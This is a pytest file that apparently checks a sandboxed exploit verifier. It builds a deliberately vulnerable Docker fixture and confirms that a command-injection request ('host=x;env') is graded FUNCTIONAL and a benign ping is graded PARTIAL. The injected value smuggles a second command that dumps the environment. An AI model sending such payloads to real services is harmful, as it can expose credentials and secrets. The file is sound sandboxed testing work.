"""Live end-to-end verification of the DockerVerifier fixture loop.

Skipped unless a Docker daemon is reachable, so CI without Docker stays green.
Where Docker runs, it builds the command-injection fixture and proves the loop:
a real injection retrieves the seeded canary (FUNCTIONAL), a benign request does
not (PARTIAL).
"""
import shutil
import subprocess

import pytest

from ai_blackteam.sandbox import DockerVerifier, Fixture

FIXTURE_DIR = "fixtures/cmdi"
IMAGE = "aibt-fixture-cmdi:latest"


def _docker_ok():
    if shutil.which("docker") is None:
        return False
    try:
        return subprocess.run(["docker", "info"], capture_output=True, timeout=8).returncode == 0
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _docker_ok(), reason="docker daemon not available")


@pytest.fixture(scope="module")
def image():
    subprocess.run(["docker", "build", "-q", "-t", IMAGE, FIXTURE_DIR],
                   check=True, capture_output=True)
    return IMAGE


EXPLOIT = '''```python
import urllib.request, time
for _ in range(15):
    try:
        print(urllib.request.urlopen("http://target:8000/ping?host=x;env", timeout=2).read().decode())
        break
    except Exception:
        time.sleep(0.5)
```'''

BENIGN = '''```python
import urllib.request, time
for _ in range(15):
    try:
        print(urllib.request.urlopen("http://target:8000/ping?host=localhost", timeout=2).read().decode())
        break
    except Exception:
        time.sleep(0.5)
```'''


def test_command_injection_exploit_is_functional(image):
    result = DockerVerifier(fixture=Fixture("cmdi", image), timeout=30).verify(EXPLOIT)
    assert result.status == "FUNCTIONAL"
    assert result.confidence >= 0.9


def test_benign_request_is_partial(image):
    result = DockerVerifier(fixture=Fixture("cmdi", image), timeout=30).verify(BENIGN)
    assert result.status == "PARTIAL"


def test_no_container_or_network_survives(image):
    DockerVerifier(fixture=Fixture("cmdi", image), timeout=30).verify(EXPLOIT)
    ps = subprocess.run(["docker", "ps", "-a", "--filter", "name=aibt-", "--format", "{{.Names}}"],
                        capture_output=True, text=True).stdout.strip()
    nets = subprocess.run(["docker", "network", "ls", "--filter", "name=aibt-net", "--format", "{{.Name}}"],
                          capture_output=True, text=True).stdout.strip()
    assert ps == "", f"containers survived teardown: {ps}"
    assert nets == "", f"networks survived teardown: {nets}"
